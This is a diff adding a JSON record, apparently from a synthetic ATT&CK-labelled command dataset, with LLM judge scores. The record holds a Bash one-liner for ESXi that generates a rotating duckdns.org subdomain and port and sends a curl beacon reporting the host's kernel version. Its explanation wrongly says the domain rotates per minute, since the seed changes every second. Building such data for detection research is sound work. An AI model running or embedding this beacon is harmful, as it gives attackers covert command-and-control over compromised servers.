@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "ESXi",
+  "shell": "Bash",
+  "command": "seed=\"$(date -u +%s)-$(hostname -s)\"; sub=$(echo -n \"$seed\" | sha256sum | cut -c1-20); dom=\"$sub.duckdns.org\"; port=$(( ( $(date -u +%s) / 60 % 40000 ) + 2000 )); curl -H \"X-ESXi: $(uname -r)\" --connect-timeout 5 \"https://$dom:$port/ping\"",
+  "explanation": "Generates a per-minute rotating DGA subdomain using epoch seconds and hostname, then calculates a time-based port for the curl beacon. This is dynamic resolution aligned with T1568.",
+  "rationale_steps": [
+    "Create a per-minute seed from epoch time and hostname.",
+    "Hash to produce a new subdomain each minute.",
+    "Compute a port from the current minute window.",
+    "Send a curl request to the generated domain and port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-0d44a1cb-4fa86ed7",
+  "source_prompt_hash": "0d44a1cb",
+  "timestamp_utc": "2025-09-30T04:15:38.906305Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, variable assignments, command substitutions, arithmetic operations, and valid curl flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by generating a time-based DGA subdomain with hostname entropy, calculating a rotating port number, and establishing a beacon connection that would evade static blocking.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T06:32:28.174655Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, correct command separators, and no discernible syntax errors for a Bash environment.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1568 by generating highly dynamic domain and port endpoints at runtime for beaconing, utilizing a DGA subdomain, a legitimate dynamic DNS service, and time-based port calculation.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T06:32:38.929257Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and command substitutions with proper separators and flags; arithmetic and variable expansions are well-formed.",
+        "semantic_score": 4,
+        "semantic_justification": "It generates a DGA-style subdomain and time-based port then beacons with curl, aligning with T1568, though the domain rotates per second (not per minute) and assumes resolvable DuckDNS entries.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T06:33:06.764648Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
